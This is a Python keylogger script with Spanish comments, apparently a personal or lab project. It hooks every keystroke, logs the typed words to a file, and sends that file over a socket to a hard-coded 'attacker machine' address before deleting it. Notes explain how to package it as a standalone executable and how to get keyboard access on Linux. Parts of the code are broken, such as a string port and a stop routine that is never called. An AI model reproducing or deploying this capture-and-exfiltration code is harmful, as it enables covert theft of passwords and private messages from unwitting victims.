import keyboard
import sys
import socket
import os
# import datetime  # Deseable si quiero saber cuando las pulsó

""" 
NOTAS IMPORTANTES

SE DEBEN INSTALAR LOS PAQUETES MEDIANTE UN ENTORNO VIRTUAL

Al desarrollar este programa dentro de un wsl, windows no permite que este tengo acceso a lo que se teclea en windows
y puede dar problemas.

Si se estuviera en ubuntu, al hacer uso de keyboard, que accede a carpetas de hardware a las que solo puede entrar root
habría que probar a meterlo en el grupo input con -> sudo usermod -aG input user

Para crear el ejecutable basta con instalar el módulo pyinstaller y ejecutar pyinstaller -onefile ./keylogger.py

Testear primero las ip a las que se envian las cosas y dentro de la máquina "victima" tener un netcat escuchando
Si se deja la ip de esta máquina el fichero se mandará al repo directamente
"""


"""
ACLARACIONES A CORREGIR

Actualmente el código no maneja ni caracteres especiales que usen shift+[tecla] ni cosas por el estilo.

Tampoco maneja si el caracter es imprimible o no. 
"""

print ("KEYLOGGER")

# Función que regista en una variable global las palabras pulsadas
palabra = ""

def pulsación_tecla(tecla_pulsada):
    global palabra
    # If que detecta cuando una tecla a sido pulsada
    if tecla_pulsada.event_type == keyboard.KEY_DOWN:
        # Se llama a la funcion de guardado de palabra si se pulsan ciertas teclas
        if tecla_pulsada.name == 'space' or tecla_pulsada.name == 'enter':
            guardar_palabra(tecla_pulsada.name)
        elif len(tecla_pulsada.name) == 1:
            palabra += tecla_pulsada.name

keyboard.hook(pulsación_tecla)

# Función usada para guardar la palabra y escribirla una vez se pulse espacio
def guardar_palabra(tecla_pulsada):
    match (tecla_pulsada):
        case 'space':
            with open('palabras.txt', 'a') as file:
                file.write(palabra + '\n')
                reset_palabra()

def reset_palabra():
    global palabra
    palabra = ""

# El fichero temporal a la máquina atacante
def enviar_archivo_sockets(fichero, ip, puerto):
    try:
        with open('palabras.txt', 'rb') as file:
            contenido = file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            conexion.connect((ip, puerto))
            conexion.sendall(contenido)
            os.remove('palabras.txt')
            sys.exit()
    except Exception as e:
        print(f'Error de conexión: {e}')

def detener_script():
    print('DETENIENDO Y ENVIANDO')
    keyboard.unhook_all()
    enviar_archivo_sockets(fichero_mensaje, direccion_ip_destino, puerto_destino)


direccion_ip_destino = '192.168.1.37'
puerto_destino = '443'
fichero_mensaje = 'palabras.txt'

try:
    keyboard.wait('esc')
except KeyboardInterrupt:
    print ("DETENIDO")
    pass